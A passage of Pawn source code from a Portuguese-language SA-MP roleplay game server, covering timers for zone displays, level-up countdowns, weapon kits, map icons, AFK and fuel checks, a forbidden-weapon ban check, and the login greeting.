		IsPlayerInRangeOfPoint(i, 10.0, -1328.4185,2675.4663,50.0625) || IsPlayerInRangeOfPoint(i, 10.0, 1596.2703,2198.8335,10.8203) ||
		IsPlayerInRangeOfPoint(i, 10.0, 2639.4871,1106.6412,10.8203) || IsPlayerInRangeOfPoint(i, 10.0, 2114.7256,920.3104,10.8203) ||
	 	IsPlayerInRangeOfPoint(i, 10.0, 1004.8821,-937.0840,42.3281) || IsPlayerInRangeOfPoint(i, 10.0, 1382.6870,459.7101,20.3452) ||
 		IsPlayerInRangeOfPoint(i, 10.0, -1676.3906,412.9636,6.9068) || IsPlayerInRangeOfPoint(i, 10.0, 70.4693,1218.8176,18.5393) ||
	 	IsPlayerInRangeOfPoint(i, 20.0, 613.1774,1692.8209,7.1875) || IsPlayerInRangeOfPoint(i, 10.0, 2147.0969,2747.4377,10.5474) ||
	 	IsPlayerInRangeOfPoint(i, 10.0, 2202.2954,2474.0007,10.5474) || IsPlayerInRangeOfPoint(i, 10.0, 655.3937,-565.2368,15.9072))
		{
			new
				zone[MAX_ZONE_NAME]
			;
			GetPlayer2DZone(i, zone, MAX_ZONE_NAME);
			format(gStr, sizeof(gStr), "~b~~h~Posto ~w~- Use: ~r~~h~/Abastecer");
			TextDrawSetString(Zones[i], gStr);
			TextDrawShowForPlayer(i, Zones[i]);
   			AreaPosto[i] = true;
		}
		else
		{
   			if(InAreaCarga[i] == false && InDescargaSolarin[i] == false && InDescargaWangCars[i] == false && InDescargaMichelin[i] == false &&
			InDescargaSprunk[i] == false && InDescargaXoomer[i] == false && InDescargaFlaischberg[i] == false && InDescargaHaul[i] == false)
			{
           		TextDrawHideForPlayer(i, Zones[i]);
			}
   			TextDrawHideForPlayer(i, Zones[i]);
			AreaPosto[i] = false;
		}
 	    if(IsPlayerInRangeOfPoint(i, 40.0, 368.4688,2504.1355,16.4844)) // Área dos contrabandistas (mercadoria)
		{
		    if(AreaContrabandista[i] == false)
		    {
		        format(gStr, sizeof(gStr), "~b~~h~Area de Carregamento - ~r~~h~/pArmas");
			    TextDrawSetString(Server_Areas[i], gStr);
			    TextDrawShowForPlayer(i, Server_Areas[i]);
                AreaContrabandista[i] = true;
			}
		}
		else
  		{
			if(AreaContrabandista[i] == true)
			{
				TextDrawHideForPlayer(i, Server_Areas[i]);
				AreaContrabandista[i] = false;
			}
		}
        if(IsPlayerInRangeOfPoint(i, 30.0, -1425.3546,-953.4561,201.0938)) // Área dos contrabandistas (entrega)
		{
            if(AreaDeContrabandista[i] == false)
		    {
		        format(gStr, sizeof(gStr), "~b~~h~Area de Descarregamento - ~r~~h~/eArmas");
			    TextDrawSetString(Server_Areas[i], gStr);
			    TextDrawShowForPlayer(i, Server_Areas[i]);
                AreaDeContrabandista[i] = true;
			}
		}
		else
  		{
			if(AreaDeContrabandista[i] == true)
			{
				TextDrawHideForPlayer(i, Server_Areas[i]);
				AreaDeContrabandista[i] = false;
			}
		}
	}
	SetTimer("HealthDown", 1000, false);
	SetTimer("CheckAreasServer", 1000, false);
	return 1;
}

forward CheckPlayerInFavela();
public CheckPlayerInFavela()
{
	foreach(Player, i)
    {
   		if(IsPlayerInPlace(i, 2059.889648, -1158.775512, 2299.889648, -958.775512))
		{
			if(GetPlayerInterior(i) == 0)
			{
 				if(GetPlayerState(i) != PLAYER_STATE_DRIVER)
				{
					format(gStr, sizeof(gStr), "      ~b~~h~Pontos: ~r~~h~%d", pInfo[i][fMatou]);
					TextDrawSetString(MSG_Matou[i], gStr);
					TextDrawShowForPlayer(i, MSG_Matou[i]);
					TextDrawShowForPlayer(i, IMG_Matou);
					TextDrawShowForPlayer(i, IMG_Morreu);
				}
				else
				{
				    TextDrawHideForPlayer(i, MSG_Matou[i]);
				    TextDrawHideForPlayer(i, IMG_Matou);
					TextDrawHideForPlayer(i, IMG_Morreu);
				}
				if(TextFavela[i] == false)
				{
					TextFavela[i] = true;
					TextDrawHideForPlayer(i, Favela_2);
					TextDrawShowForPlayer(i, Favela_1);
					GangZoneShowForPlayer(i, GZ_Favela, 0xFF6633AA);
				}
				else if(TextFavela[i] == true)
				{
			   		TextFavela[i] = false;
	  		    	TextDrawHideForPlayer(i, Favela_1);
			    	TextDrawShowForPlayer(i, Favela_2);
			    	GangZoneShowForPlayer(i, GZ_Favela, 0xFFFFFF99);
				}
			}
		}
   		else
		{
			TextDrawHideForPlayer(i, MSG_Matou[i]);
			TextDrawHideForPlayer(i, Favela_1);
			TextDrawHideForPlayer(i, Favela_2);
  			TextDrawHideForPlayer(i, IMG_Matou);
			TextDrawHideForPlayer(i, IMG_Morreu);
			GangZoneHideForPlayer(i, GZ_Favela);
			GangZoneStopFlashForPlayer(i, GZ_Favela);
		}
	}
	SetTimer("CheckPlayerInFavela", 1000, false);
	return 1;
}

forward upNivel();
public upNivel()
{
	foreach(Player, i)
	{
		if(pInfo[i][Logado] == true)
	    {
			if(pInfo[i][SegUP] > 0)
			{
				pInfo[i][SegUP] --;
			}
			if(pInfo[i][SegUP] == 0 && pInfo[i][MinUP] >= 1)
			{
				pInfo[i][SegUP] = 59;
				pInfo[i][MinUP] --;
			}
			if(pInfo[i][MinUP] == 0 && pInfo[i][SegUP] == 0)
			{
				pInfo[i][SegUP] = 59;
				pInfo[i][MinUP] = 9;
				UPLevel(i);
			}
			format(gStr, sizeof(gStr), "~g~+~y~EXP~y~: ~w~%02d~y~:~w~%02d", pInfo[i][MinUP], pInfo[i][SegUP]);
		 	TextDrawSetString(TextLevelUP[i], gStr);
			if(pInfo[i][RelogioCor] == 0)
			{
				format(gStr, sizeof(gStr), "~g~+~y~EXP~y~: ~w~%02d~y~:~w~%02d", pInfo[i][MinUP], pInfo[i][SegUP]);
		    	TextDrawSetString(TextLevelUP[i], gStr);
	    	}
			else if(pInfo[i][RelogioCor] == 1)
			{
				format(gStr, sizeof(gStr), "~g~+~y~EXP: ~w~%02d~y~:~w~%02d", pInfo[i][MinUP], pInfo[i][SegUP]);
		    	TextDrawSetString(TextLevelUP[i], gStr);
	    	}
			else if(pInfo[i][RelogioCor] == 2)
			{
				format(gStr, sizeof(gStr), "~g~+~y~EXP: ~w~%02d~y~:~w~%02d", pInfo[i][MinUP], pInfo[i][SegUP]);
		    	TextDrawSetString(TextLevelUP[i], gStr);
	    	}
			else if(pInfo[i][RelogioCor] == 3)
			{
				format(gStr, sizeof(gStr), "~g~+~y~EXP: ~w~%02d~y~:~w~%02d", pInfo[i][MinUP], pInfo[i][SegUP]);
		    	TextDrawSetString(TextLevelUP[i], gStr);
	    	}
			else if(pInfo[i][RelogioCor] == 4)
			{
				format(gStr, sizeof(gStr), "~g~+~y~EXP: ~w~%02d~y~:~w~%02d", pInfo[i][MinUP], pInfo[i][SegUP]);
		    	TextDrawSetString(TextLevelUP[i], gStr);
	    	}
			else if(pInfo[i][RelogioCor] == 5)
			{
				format(gStr, sizeof(gStr), "~g~+~y~EXP: ~w~%02d~y~:~w~%02d", pInfo[i][MinUP], pInfo[i][SegUP]);
		    	TextDrawSetString(TextLevelUP[i], gStr);
	    	}
			else if(pInfo[i][RelogioCor] == 6)
			{
				format(gStr, sizeof(gStr), "~g~+~y~EXP: ~w~%02d~y~~h~:~w~%02d", pInfo[i][MinUP], pInfo[i][SegUP]);
		    	TextDrawSetString(TextLevelUP[i], gStr);
	    	}
			else if(pInfo[i][RelogioCor] == 7)
			{
				format(gStr, sizeof(gStr), "~g~+~y~EXP: ~w~%02d~y~~h~:~w~%02d", pInfo[i][MinUP], pInfo[i][SegUP]);
		    	TextDrawSetString(TextLevelUP[i], gStr);
	    	}
			else if(pInfo[i][RelogioCor] == 8)
			{
				format(gStr, sizeof(gStr), "~g~+~y~EXP: ~w~%02d~y~~h~:~w~%02d", pInfo[i][MinUP], pInfo[i][SegUP]);
		    	TextDrawSetString(TextLevelUP[i], gStr);
	    	}
			else if(pInfo[i][RelogioCor] == 9)
			{
				format(gStr, sizeof(gStr), "~g~+~y~EXP: ~w~%02d~y~~h~:~w~%02d", pInfo[i][MinUP], pInfo[i][SegUP]);
		    	TextDrawSetString(TextLevelUP[i], gStr);
	    	}
			else if(pInfo[i][RelogioCor] == 10)
			{
				format(gStr, sizeof(gStr), "~g~+~y~EXP: ~w~%02d~y~~h~:~w~%02d", pInfo[i][MinUP], pInfo[i][SegUP]);
		    	TextDrawSetString(TextLevelUP[i], gStr);
	    	}
    	}
		if(IsPlayerInPlace(i, 2059.889648, -1158.775512, 2299.889648, -958.775512) && (GetPlayerInterior(i) == 0))
		{
			if((pInfo[i][Tem_Kit] == 1) && (setoukit[i] == 0) && (validArmas[i] == false))
			{
			    give[i] = false;
			    ResetPlayerWeapons(i);
				validArmas[i] = true;
    			CarregarKit(i);
				setoukit[i] = 1;
			}
		}
		if(!IsPlayerInPlace(i, 2059.889648, -1158.775512, 2299.889648, -958.775512))
		{
			if((pInfo[i][Tem_Kit] == 1) && (setoukit[i] == 1) && (validArmas[i] == true))
			{
			    if(epDM[i][dmParticipando] == 0)
				{
					/*if(trafcArma[i] == -1)
					{
					    ResetPlayerWeapons(i);
					}*/
					/*else */if(trafcArma[i] != -1 && give[i] == false)
					{
					    give[i] = true;
					    ResetPlayerWeapons(i);
						GivePlayerWeapon(i, trafcArma[i], 250);
					}
				}
   				validArmas[i] = false;
				setoukit[i] = 0;
				armasProf(i);
			}
		}
	 	/*if(in_z[i] != -1) // GZ
		{
      		if((validArmas[i] == false))
		    {
		        give[i] = false;
		    	ResetPlayerWeapons(i);
		        validArmas[i] = true;
		    	SetPlayerArmas(i);
			}
		}
		else
		{*/
		if(!IsPlayerInPlace(i, 2059.889648, -1158.775512, 2299.889648, -958.775512) && (validArmas[i] == true))
		{
		    validArmas[i] = false;
		  	if(epDM[i][dmParticipando] == 0)
			{
				/*if(trafcArma[i] == -1)
				{
				    ResetPlayerWeapons(i);
				}*/
				/*else */if(trafcArma[i] != -1 && give[i] == false)
				{
				    ResetPlayerWeapons(i);
				    give[i] = true;
					GivePlayerWeapon(i, trafcArma[i], 250);
				}
			}
		   	armasProf(i);
		}
		//}
  		if(!IsPlayerInPlace(i, 2059.889648, -1158.775512, 2299.889648, -958.775512) &&
		aInfo[i][Admin] != 1 && pInfo[i][Prof] != POL_CIVIL && pInfo[i][Prof] != POL_MILITAR && pInfo[i][Prof] != POL_FEDERAL &&
		pInfo[i][Prof] != GUARDA_TRANSITO && pInfo[i][Prof] != POL_RODOVIARIO && pInfo[i][Prof] != FOTOGRAFO && pInfo[i][Prof] != PROSTITUTA &&
  		pInfo[i][Prof] != HITMAN && pInfo[i][Prof] != TRAF_DROGAS && pInfo[i][Prof] != TRAF_ARMAS && pInfo[i][Prof] != ATIRADOR &&
		pInfo[i][Prof] != TERRORISTA && pInfo[i][Prof] != CHEFE_MAFIA && pInfo[i][Prof] != BOMBEIRO && ArenaDuelo[i] == false)
		{
      		if(epDM[i][dmParticipando] == 0)
			{
				/*if(trafcArma[i] == -1)
				{
				    ResetPlayerWeapons(i);
				}*/
				/*else */if(trafcArma[i] != -1 && give[i] == false)
				{
				    ResetPlayerWeapons(i);
				    give[i] = true;
					GivePlayerWeapon(i, trafcArma[i], 250);
				}
			}
		}
		if(!IsPlayerInPlace(i, 2059.889648, -1158.775512, 2299.889648, -958.775512) && ArenaDuelo[i] == false)
		{
            new pname[MAX_PLAYER_NAME];
        	GetPlayerName(i,pname,sizeof(pname));
      		if(pInfo[i][AFK] == true)
		    {
	            SetPlayerChatBubble(i, "Jogador(a) AFK", 0x00B7FFAA, 20.0, 10000);
		    }
			else if(aInfo[i][Admin] == 1 && aInfo[i][Oculto] == false && WE_GetInt(f(i), "AdminL") == 0)
			{
			    SetPlayerChatBubble(i, "{FF1E1E}Admin{1E90FF}istrador(a)", AZUL_WE, 20.0, 10000);
			}
	 		else if(aInfo[i][Moderador] == 1 && aInfo[i][Oculto] == false && WE_GetInt(f(i), "AdminL") == 0)
			{
			    SetPlayerChatBubble(i, "{1E90FF}Mod{FF1E1E}erador(a)", AZUL_WE, 20.0, 10000);
			}
 			else if(aInfo[i][Corregedor] == 1 && aInfo[i][Moderador] == 0 && aInfo[i][Admin] == 0 && aInfo[i][Oculto] == false && WE_GetInt(f(i), "AdminL") == 0)
			{
			    SetPlayerChatBubble(i, "{1E90FF}Corre{FF1E1E}gedor", AZUL_WE, 20.0, 10000);
			}
  	 		else if(aInfo[i][Ajudante] == 1 && aInfo[i][Oculto] == false && WE_GetInt(f(i), "AdminL") == 0)
			{
			    SetPlayerChatBubble(i, "{1E90FF}Hel{FF1E1E}per", AZUL_WE, 20.0, 10000);
			}
			else if(WE_GetInt(f(i), "AdminL") == 1 && aInfo[i][Oculto] == false)
			{
			    SetPlayerChatBubble(i, "{1E90FF}Do{FF1E1E}no", AZUL_WE, 20.0, 10000);
			}
		}
		if(GetPlayerSpecialAction(i) == SPECIAL_ACTION_USEJETPACK)
		{
		    if(aInfo[i][Admin] != 1 && pInfo[i][Jetpack] != 1)
		    {
				SendClientMessage(i, COR_ERRO, "Você não possui um Jetpack!");
				new
					Float:jx, Float:jy, Float:jz
				;
				GetPlayerPos(i, jx, jy, jz);
				SetPlayerPos(i, jx, jy, jz);
				SetPlayerSpecialAction(i, SPECIAL_ACTION_NONE);
			}
		}
		for(new w; w < sizeof(ArmasProibidas); ++w)
		{
			if(GetPlayerWeapon(i) == ArmasProibidas[w])
			{
			    new
					wName[24]
				;
				GetWeaponName(ArmasProibidas[w], wName, sizeof(wName));

				if(aInfo[i][Admin] == 0 && epDM[i][dmParticipando] == 0)
				{
					#if ACTION == 0
						if(aInfo[i][Admin] == 1 || aInfo[i][Moderador] == 1)
						{
							format(gStr, sizeof(gStr), "O(A) jogador(a) %s [ID: %d] foi banido por usar uma arma proibida. (%s)", PlayerName(i), i, wName);
							SendClientMessage(i, -1, gStr);
						}
						BanEx(i, "Weapon Cheat");
					#elseif ACTION == 1
					    if(aInfo[i][Admin] == 1 || aInfo[i][Moderador] == 1)
					    {
					        format(gStr, sizeof(gStr), "O(A) jogador(a) %s [ID: %d] foi kickado por usar uma arma proibida. (%s)", PlayerName(i), i, wName);
					    	SendClientMessage(i, -1, gStr);
					    }
						Kick(i);
					#elseif ACTION == 2
					    if(aInfo[i][Admin] == 1 || aInfo[i][Moderador] == 1)
					    {
					        format(gStr, sizeof(gStr), "O(A) jogador(a) %s [ID: %d] tentou usar uma arma proibida e não obteve sucesso. (%s)", PlayerName(i), i, wName);
					    	SendClientMessage(i, -1, gStr);
					    }
						RemoveWeaponSlot(i, GetWeaponSlot(ArmasProibidas[w]));
					#endif
				}
			}
		}
	}
	SetTimer("upNivel", 1000, false);
	return 1;
}

forward TimerdeDez();
public TimerdeDez()
{
    SetTimer("TimerdeDez", 10000, false);

	foreach(Player, i)
	{
	    if(pInfo[i][PLAYER_VIP] == 1)
	    {
	        TextDrawShowForPlayer(i, VIPtext[i]);
	    }
	    else
	    {
	        TextDrawHideForPlayer(i, VIPtext[i]);
	    }
		format(gstring, sizeof(gstring), "~b~~h~Nivel: ~w~%d", pInfo[i][Level]);
		TextDrawSetString(InfoLevel[i], gstring);
	 	new
			casa_id,
			Float:proxima_casa,
			Float:casa_distancia = 99999.9
		;
	  	for(new CasaID = 1; CasaID < MAX_CASAS; ++CasaID)
	 	{
   			proxima_casa = GetPlayeyCasaDistacia(i, CasaID);

			if(proxima_casa < casa_distancia)
	    	{
	        	casa_distancia = proxima_casa;
	          	casa_id = CasaID;
			}
		}
		RemovePlayerMapIcon(i, 31);

		if(!strcmp(CasaInfo[casa_id][Proprietario], "Ninguem", true))
		{
    		SetPlayerMapIcon(i, icon_casa, CasaInfo[casa_id][PickupX], CasaInfo[casa_id][PickupY], CasaInfo[casa_id][PickupZ], 31, 0);
		}
		else
		{
			SetPlayerMapIcon(i, icon_casa, CasaInfo[casa_id][PickupX], CasaInfo[casa_id][PickupY], CasaInfo[casa_id][PickupZ], 32, 0);
		}

	   	new
			empresa_id,
			Float:proxima_empresa,
			Float:empresa_distancia = 99999.9
		;

	  	for(new m = 1; m < MAX_EMPRESAS; ++m)
	 	{
	    	proxima_empresa = GetPlayeyEmpresaDistacia(i, m);

	     	if(proxima_empresa < empresa_distancia)
	    	{
	       		empresa_distancia = proxima_empresa;
	        	empresa_id = m;
			}
		}

		RemovePlayerMapIcon(i, 33);

		if(!strcmp(EmpresaInfo[empresa_id][Proprietario], "Ninguem", true))
		{
		    // empresas roupas
		    if(empresa_id == 21
			 || empresa_id == 26
			 || empresa_id == 30
			 || empresa_id == 31
			 || empresa_id == 32
			 || empresa_id == 34
			 || empresa_id == 39
			 || empresa_id == 54
			 || empresa_id == 55
			 || empresa_id == 56
			 || empresa_id == 58
			 || empresa_id == 66
			 || empresa_id == 67
			 || empresa_id == 89
			 || empresa_id == 96
			 || empresa_id == 108
			 || empresa_id == 109) {
			 	SetPlayerMapIcon(i, icon_empr, EmpresaInfo[empresa_id][PickupX], EmpresaInfo[empresa_id][PickupY], EmpresaInfo[empresa_id][PickupZ], 45, 0);
			}
			else
			{
			    // empresas hamburguer
			    if(empresa_id == 16 || empresa_id == 45 || empresa_id == 62 || empresa_id == 65 || empresa_id == 68 || empresa_id == 70 || empresa_id == 95)
			    {
			        SetPlayerMapIcon(i, icon_empr, EmpresaInfo[empresa_id][PickupX], EmpresaInfo[empresa_id][PickupY], EmpresaInfo[empresa_id][PickupZ], 10, 0);
			    }
			    else
			    {
			        if(empresa_id == 7 || empresa_id == 8 || empresa_id == 44 || empresa_id == 73 || empresa_id == 80)
			        {
						SetPlayerMapIcon(i, icon_empr, EmpresaInfo[empresa_id][PickupX], EmpresaInfo[empresa_id][PickupY], EmpresaInfo[empresa_id][PickupZ], 18, 0);
					}
			        else
			        {
			            // academias
			            if(empresa_id == 12 || empresa_id == 99 || empresa_id == 15 || empresa_id == 78)
			            {
							SetPlayerMapIcon(i, icon_empr, EmpresaInfo[empresa_id][PickupX], EmpresaInfo[empresa_id][PickupY], EmpresaInfo[empresa_id][PickupZ], 54, 0);
						}
			            else
			            {
			                if(empresa_id == 9)
			                {
				                SetPlayerMapIcon(i, icon_empr, EmpresaInfo[empresa_id][PickupX], EmpresaInfo[empresa_id][PickupY], EmpresaInfo[empresa_id][PickupZ], 39, 0);
							}
							else
							{
								SetPlayerMapIcon(i, icon_empr, EmpresaInfo[empresa_id][PickupX], EmpresaInfo[empresa_id][PickupY], EmpresaInfo[empresa_id][PickupZ], 44, 0);
							}
						}
					}
				}
			}
		}
		else
		{
		    if(empresa_id == 21
			 || empresa_id == 26
			 || empresa_id == 30
			 || empresa_id == 31
			 || empresa_id == 32
			 || empresa_id == 34
			 || empresa_id == 39
			 || empresa_id == 54
			 || empresa_id == 55
			 || empresa_id == 56
			 || empresa_id == 58
			 || empresa_id == 66
			 || empresa_id == 67
			 || empresa_id == 89
			 || empresa_id == 96
			 || empresa_id == 108
			 || empresa_id == 109) {
			 	SetPlayerMapIcon(i, icon_empr, EmpresaInfo[empresa_id][PickupX], EmpresaInfo[empresa_id][PickupY], EmpresaInfo[empresa_id][PickupZ], 45, 0);
			}
			else
			{
				// empresas hamburguer
			    if(empresa_id == 16 || empresa_id == 45 || empresa_id == 62 || empresa_id == 65 || empresa_id == 68 || empresa_id == 70 || empresa_id == 95)
			    {
			        SetPlayerMapIcon(i, icon_empr, EmpresaInfo[empresa_id][PickupX], EmpresaInfo[empresa_id][PickupY], EmpresaInfo[empresa_id][PickupZ], 10, 0);
			    }
			    else
			    {
			        if(empresa_id == 7 || empresa_id == 8 || empresa_id == 44 || empresa_id == 73 || empresa_id == 80)
			        {
						SetPlayerMapIcon(i, icon_empr, EmpresaInfo[empresa_id][PickupX], EmpresaInfo[empresa_id][PickupY], EmpresaInfo[empresa_id][PickupZ], 18, 0);
					}
			        else
			        {
			            // academias
			            if(empresa_id == 12 || empresa_id == 99 || empresa_id == 15 || empresa_id == 78)
			            {
							SetPlayerMapIcon(i, icon_empr, EmpresaInfo[empresa_id][PickupX], EmpresaInfo[empresa_id][PickupY], EmpresaInfo[empresa_id][PickupZ], 54, 0);
						}
			            else
			            {
			                if(empresa_id == 9)
			                {
				                SetPlayerMapIcon(i, icon_empr, EmpresaInfo[empresa_id][PickupX], EmpresaInfo[empresa_id][PickupY], EmpresaInfo[empresa_id][PickupZ], 39, 0);
							}
				            else
				            {
								SetPlayerMapIcon(i, icon_empr, EmpresaInfo[empresa_id][PickupX], EmpresaInfo[empresa_id][PickupY], EmpresaInfo[empresa_id][PickupZ], 43, 0);
							}
						}
					}
				}
			}
		}
	}
	new
		hora, minuto, segundo, ano, mes, dia
	;
	gettime(hora, minuto, segundo);
	getdate(ano, mes, dia);
	new
		iTempo[24]
	;
    format(iTempo, sizeof(iTempo), "%02d:%02d", hora, minuto);
	TextDrawSetString(Relogio, iTempo);
	new
		iData[24]
	;
	format(iData, sizeof(iData), "%02d/%02d/%02d", dia, mes, ano);
	TextDrawSetString(Data, iData);
	/*if(hora == 6) {
		SetWorldTime(8);
	}
    else if(hora == 9) {
		SetWorldTime(10);
	}
    else if(hora == 12) {
		SetWorldTime(12);
	}
    else if(hora == 13) {
		SetWorldTime(15);
	}
    else if(hora == 14) {
		SetWorldTime(16);
	}
    else if(hora == 15) {
		SetWorldTime(18);
	}
    else if(hora == 17) {
		SetWorldTime(19);
	}
    else if(hora == 17) {
		SetWorldTime(20);
	}
    else if(hora == 18) {
		SetWorldTime(21);
	}
    else if(hora == 19) {
		SetWorldTime(23);
	}
    else if(hora == 20) {
		SetWorldTime(0);
	}
    else if(hora == 22) {
		SetWorldTime(0);
	}
    else if(hora == 0) {
		SetWorldTime(3);
	}
    else if(hora == 5) {
		SetWorldTime(5);
	}*/
	return 1;
}

forward tresMinutos();
public tresMinutos()
{
	// Retorna o temporizador
    SetTimer("tresMinutos", 180000, false);
	// Mensagem arleatória para todos
 	new
		randMSG = random(sizeof(RandomMSG))
	;
    SendClientMessageToAll(0xFFFFFFAA, RandomMSG[randMSG]);
    // Checa a hora e atualiza o taximetro
    new
		hora, minuto, segundo
	;
	gettime(hora, minuto, segundo);
	if(hora >= 18 || hora < 6)
	{
	    Taxi_Bandeira = 2;
	}
	else if(hora < 18 || hora >= 6)
	{
	    Taxi_Bandeira = 1;
	}
	// Faz um loop (passa por todos jogadores) para checar se alguém está ausente
	foreach(Player, i)
	{
		if(pInfo[i][Logado] == true && aInfo[i][Admin] == 0 && ParticipandoEvento[i] == 0 && epDM[i][dmParticipando] == 0)
		{
 			if(pInfo[i][AFK] == false)
			{
			    if(TempoAFK[i] >= 2)
			    {
				    pInfo[i][AFK] = true;

				    format(gStr, sizeof(gStr), "{FFFFFF}%s {A0B1F3}você foi bloqueado(a) por ficar ausente!", PlayerName(i));
					SendClientMessage(i, 0xA0B1F3FF, gStr);

					if(GetPlayerState(i) == PLAYER_STATE_DRIVER)
					{
	 					TextDrawHideForPlayer(i, Velocimetro0[i]);
	 					TextDrawHideForPlayer(i, Velocimetro1[i]);
	 					TextDrawHideForPlayer(i, Velocimetro2[i]);
	 					TextDrawHideForPlayer(i, Velocimetro3[i]);
	 					TextDrawHideForPlayer(i, Velocimetro4[i]);
	 					TextDrawHideForPlayer(i, Velocimetro5[i]);
	 					TextDrawHideForPlayer(i, Velocimetro6[i]);
	 					TextDrawHideForPlayer(i, Velocimetro7[i]);
	 					TextDrawHideForPlayer(i, Velocimetro8[i]);
	     			}
					TextDrawShowForPlayer(i, AFK1);
					TextDrawShowForPlayer(i, AFK2);
					KillTimer(ContagemFome[i]);
					KillTimer(ContagemSede[i]);
					KillTimer(ContagemSono[i]);
					pInfo[i][NeedsOff] = true;
				}
			}
			if(pInfo[i][AFK] == false)
			{
			 	GetPlayerPos(i, GetPosPlayer[0], GetPosPlayer[1], GetPosPlayer[2]);

	            if(!floatcmp(GetPosPlayer[0], PlayerLastPos[i][LastX]) && !floatcmp(GetPosPlayer[1], PlayerLastPos[i][LastY]))
				{
					TempoAFK[i] ++;
				}
				else
				{
					TempoAFK[i] = 0;
				}
	  			PlayerLastPos[i][LastX] = GetPosPlayer[0];
				PlayerLastPos[i][LastY] = GetPosPlayer[1];
				PlayerLastPos[i][LastZ] = GetPosPlayer[2];
			}
		}
	}
    return 1;
}

forward AtualizarCombustivel();
public AtualizarCombustivel()
{
    SetTimer("AtualizarCombustivel", 120000, false);

	foreach(Player, i)
	{
	    new
			vehicleid = GetPlayerVehicleID(i),
			vehicleModel = GetVehicleModel(vehicleid)
		;
		if(GetPlayerState(i) == PLAYER_STATE_DRIVER && vehicleModel != 481 && vehicleModel != 509 && vehicleModel != 510)
		{
 			if(pInfo[i][Gas] <= 0)
			{
				SendClientMessage(i, COR_ERRO, "Você não pode andar sem combustível, procure o posto mais próximo e abasteça!");
    			WE_SetInt(f(i), "Gasolina", 0);
				pInfo[i][Gas] = 0;
				RemovePlayerFromVehicle(i);
    			PlayerPlaySound(i, 1055, 0.0, 0.0, 0.0);
			}
			else if(pInfo[i][Gas] > 0)
			{
				if(pInfo[i][Gas] <= 10)
				{
					SendClientMessage(i, VERMELHO_WE, "Atenção{FFFFFF}, seu combustível está no fim, procure o posto mais próximo.");
					pInfo[i][Gas] --;
					WE_SetInt(f(i), "Gasolina", pInfo[i][Gas]);
					PlayerPlaySound(i, 1085, 0.0, 0.0, 0.0);
				}
				else
				{
				    pInfo[i][Gas] --;
					if(pInfo[i][Gas] > 100 && aInfo[i][Admin] != 1 && aInfo[i][Moderador] != 1)
					{
					    pInfo[i][Gas] = 100;
					}
				}
			}
		}
 		if(GetPlayerPing(i) > LIMITE_PING)
		{
			SendClientMessage(i, COR_ERRO, "Você excedeu o limite de ping que é de 2500, ajuste sua conexão!");
			format(gstring, sizeof(gstring), "O(A) jogador(a) %s foi kickado(a) por exceder o limite de ping!", PlayerName(i), LIMITE_PING);
			SendClientMessageToAll(VERMELHO_WE, gstring);
			Kick(i);
		}
	}
    return 1;
}

public OnGameModeExit()
{
	foreach(Player, i)
	{
		if(pInfo[i][Preso] > 1)
		{
			KillTimer(T_Preso[i]);
		}
		SalvarFile(i);
		SalvarFSS(i);
	}
	DestruirTextsDraws();

	for(new i; i < 5; ++i)
	{
		TextDrawDestroy(dmColoText[i]);
	}
	TextDrawDestroy(dm_text_Top5[0]);
	TextDrawDestroy(dm_text_Top5[1]);
	TextDrawDestroy(dmiTimer[0]);
	TextDrawDestroy(dmiTimer[1]);

    evDMreset();

    EventoApe = false;
    EventoVei = false;

    WE_Exit();

	return 1;
}

public OnPlayerRequestClass(playerid, classid)
{
	if(!IsPlayerNPC(playerid))
    {
    	TextDrawHideForPlayer(playerid, WE_GAMES1);
		TextDrawHideForPlayer(playerid, WE_GAMES2);
		TextDrawHideForPlayer(playerid, BoxCarregando);

		if(pInfo[playerid][Logado] == false)
		{
			new
				hora,
				minuto,
				segundo
			;
		    gettime(hora, minuto, segundo);

		    LimparChat(playerid, 50);

		    format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));

			if(fexist(gFile))
			{
				if(hora >= 0 && hora <= 5)
			    {
			        SendClientFormat(playerid, AZUL_WE, " {747474}Boa noite {FFFFFF}%s", PlayerName(playerid));
				}
	   		    if(hora >= 6 && hora <= 11)
			    {
					SendClientFormat(playerid, AZUL_WE, " {FFFF00}Bom dia {FFFFFF}%s", PlayerName(playerid));
				}
	  			if(hora >= 12 && hora <= 17)
			    {
			        SendClientFormat(playerid, AZUL_WE, " {FF7700}Boa tarde {FFFFFF}%s", PlayerName(playerid));
				}
				if(hora >= 18 && hora <= 23)
			    {
			        SendClientFormat(playerid, AZUL_WE, " {1E5AFF}Boa noite {FFFFFF}%s", PlayerName(playerid));
				}
				SendClientMessage(playerid, VERMELHO_WE, " {FFFFFF}Brasil - World Evolution RPG 1.0 {FF1E1E}[0.3.7]");
				SendClientMessage(playerid, AZUL_WE, " Seja bem-vindo(a) novamente, caso tenha dúvidas, use: /Ajuda ou /Comandos");
				SendClientMessage(playerid, 0xFFFFFFAA, "  ");
				format(s5Doze, sizeof(s5Doze), "{FFFFFF}Bem-vindo(a) ao {FF1E1E}World {1E90FF}Evolution {FFF36E}RPG{FFFFFF}\n\nConta: %s\nStatus: {00FF00}Registrada{FFFFFF}\n\nVersão 1.0 - Não há notícias, fique atento ao fórum!\n* Insira sua senha abaixo para logar:", PlayerName(playerid));
				ShowPlayerDialog(playerid, D_LOGIN, DIALOG_STYLE_PASSWORD, "{FFFFFF} {FFFFFF}World Evoltion RPG 1.0", s5Doze, "Logar", "Cancelar");
			}
			else
			{
				if(hora >= 0 && hora <= 5)
			    {
			        SendClientFormat(playerid, AZUL_WE, " {747474}Boa noite {FFFFFF}%s", PlayerName(playerid));
				}
	   		    if(hora >= 6 && hora <= 11)
			    {
					SendClientFormat(playerid, AZUL_WE, " {FFFF00}Bom dia {FFFFFF}%s", PlayerName(playerid));
				}
	  			if(hora >= 12 && hora <= 17)
			    {
			        SendClientFormat(playerid, AZUL_WE, " {FF7700}Boa tarde {FFFFFF}%s", PlayerName(playerid));
				}
				if(hora >= 18 && hora <= 23)
			    {
			        SendClientFormat(playerid, AZUL_WE, " {1E5AFF}Boa noite {FFFFFF}%s", PlayerName(playerid));
				}
				SendClientMessage(playerid, VERMELHO_WE, " {FFFFFF}Brasil - World Evolution RPG 1.0 {FF1E1E}[0.3.7]");
				SendClientMessage(playerid, AZUL_WE, " {FFFFFF}Seja bem-vindo(a) pela primeira vez em nosso servidor, caso tenha dúvidas digite: /Ajuda ou /Comandos");
				SendClientMessage(playerid, 0xFFFFFFAA, "  ");
